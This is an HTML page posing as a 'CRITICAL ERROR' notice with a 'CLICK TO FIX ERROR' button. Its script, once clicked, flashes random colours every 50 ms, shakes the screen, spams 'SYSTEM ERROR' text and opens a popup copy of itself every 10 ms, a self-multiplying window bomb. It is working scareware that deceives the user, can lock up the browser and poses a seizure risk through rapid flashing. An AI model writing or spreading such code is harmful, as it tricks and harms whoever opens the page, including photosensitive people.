<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CRITICAL ERROR</title>
<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    background: black;
    overflow: hidden;
    font-family: Arial, sans-serif;
}

#center {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

button {
    font-size: 26px;
    padding: 25px 50px;
    cursor: pointer;
    animation: blink 0.4s infinite;
}

@keyframes blink {
    0% { background: red; color: white; }
    50% { background: white; color: black; }
    100% { background: red; color: white; }
}

.error {
    position: absolute;
    color: red;
    font-size: 24px;
    pointer-events: none;
    animation: shake 0.1s infinite;
}

@keyframes shake {
    0% { transform: translate(0,0); }
    25% { transform: translate(5px,-5px); }
    50% { transform: translate(-5px,5px); }
    75% { transform: translate(5px,5px); }
    100% { transform: translate(-5px,-5px); }
}
</style>
</head>
<body>

<div id="center">
    <button onclick="start()">CLICK TO FIX ERROR</button>
</div>

<script>
let x = 0;
let y = 0;
let chaos = true;

const winW = 200;
const winH = 150;

function rand(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function start() {
    document.body.innerHTML = "";

    // Background flashing
    setInterval(() => {
        document.body.style.background =
            `rgb(${rand(0,255)},${rand(0,255)},${rand(0,255)})`;
    }, 50);

    // Screen shaking
    setInterval(() => {
        document.body.style.transform =
            `translate(${rand(-20,20)}px, ${rand(-20,20)}px)`;
    }, 30);

    // ERROR text spam
    setInterval(() => {
        const e = document.createElement("div");
        e.className = "error";
        e.innerText = "SYSTEM ERROR";
        e.style.left = rand(0, window.innerWidth) + "px";
        e.style.top = rand(0, window.innerHeight) + "px";
        document.body.appendChild(e);

        if (document.body.children.length > 300) {
            document.body.removeChild(document.body.children[0]);
        }
    }, 20);

    const screenW = screen.width;
    const screenH = screen.height;

    // Window spam (FAST)
    setInterval(() => {
        window.open(
            location.href,
            "_blank",
            `width=${winW},height=${winH},left=${x},top=${y}`
        );

        x += winW;

        if (x + winW > screenW) {
            x = 0;
            y += winH;
        }

        if (y + winH > screenH) {
            x = rand(0, screenW);
            y = rand(0, screenH);
        }
    }, 10); // ACTUAL 0.01 sec ðŸ˜ˆ
}
</script>

</body>
</html>
